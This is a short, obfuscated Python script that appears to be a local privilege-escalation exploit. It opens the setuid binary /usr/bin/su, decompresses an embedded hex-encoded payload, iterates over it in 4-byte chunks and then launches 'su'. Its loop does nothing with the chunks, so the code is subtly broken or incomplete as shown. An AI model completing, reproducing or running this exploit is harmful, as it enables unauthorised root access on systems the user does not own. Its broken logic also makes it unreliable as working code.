#!/usr/bin/env python3
import os as g
import zlib
def d(x):
    return bytes.fromhex(x)
f = g.open("/usr/bin/su", 0)
e = zlib.decompress(d("78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3"))
i = 0
while i < len(e):
    chunk = e[i:i+4]
    i += 4
g.system("su")
